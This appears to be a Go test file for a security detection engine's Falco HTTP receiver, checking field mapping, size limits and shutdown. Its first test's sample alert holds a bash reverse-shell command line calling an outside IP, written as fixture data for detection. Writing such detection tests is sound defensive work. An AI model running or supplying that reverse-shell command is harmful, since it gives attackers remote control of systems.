package ingest

import (
	"context"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"sentinelmesh/detection-engine/internal/types"
)

func TestFalcoHTTPReceiverMapsJSONOutputFields(t *testing.T) {
	out := make(chan types.RawEvent, 1)
	r := NewFalcoHTTPReceiver("127.0.0.1:0", "/falco/events", out)

	req := httptest.NewRequest("POST", "/falco/events", strings.NewReader(`{
		"time":"2026-10-08T00:00:00.123456789Z",
		"rule":"SentinelMesh - Reverse shell command pattern",
		"priority":"Critical",
		"hostname":"host-a",
		"tags":["execution"],
		"output":"reverse shell",
		"output_fields":{
			"proc.pid":1234,
			"proc.ppid":12,
			"proc.exe":"/bin/bash",
			"proc.cmdline":"bash -i >& /dev/tcp/10.20.30.40/4444 0>&1",
			"user.name":"www-data"
		}
	}`))
	w := httptest.NewRecorder()
	r.handle(w, req)
	if w.Code != 202 {
		t.Fatalf("status=%d body=%s", w.Code, w.Body.String())
	}

	select {
	case ev := <-out:
		if ev.Source != "falco" {
			t.Fatalf("source=%q", ev.Source)
		}
		if ev.Timestamp.Format(time.RFC3339Nano) != "2026-10-08T00:00:00.123456789Z" {
			t.Fatalf("timestamp=%s", ev.Timestamp.Format(time.RFC3339Nano))
		}
		if ev.Payload["proc.exe"] != "/bin/bash" {
			t.Fatalf("proc.exe=%v", ev.Payload["proc.exe"])
		}
		if ev.Payload["proc.pid"] == nil {
			t.Fatal("proc.pid missing from flattened output_fields")
		}
		if ev.Payload["proc.cmdline"] != "bash -i >& /dev/tcp/10.20.30.40/4444 0>&1" {
			t.Fatalf("cmdline=%v", ev.Payload["proc.cmdline"])
		}
	case <-time.After(time.Second):
		t.Fatal("receiver did not emit raw event")
	}
}

func TestFalcoHTTPReceiverRejectsOversizedPayload(t *testing.T) {
	out := make(chan types.RawEvent, 1)
	r := NewFalcoHTTPReceiver("127.0.0.1:0", "/falco/events", out)
	body := strings.Repeat("x", (2<<20)+1)
	req := httptest.NewRequest("POST", "/falco/events", strings.NewReader(body))
	req.ContentLength = int64(len(body))
	w := httptest.NewRecorder()
	r.handle(w, req)
	if w.Code != 413 {
		t.Fatalf("status=%d want 413", w.Code)
	}
}

func TestFalcoHTTPReceiverShutdown(t *testing.T) {
	out := make(chan types.RawEvent, 1)
	r := NewFalcoHTTPReceiver("127.0.0.1:0", "/falco/events", out)
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	if err := r.Start(ctx); err != nil {
		t.Fatalf("Start after cancelled context: %v", err)
	}
}
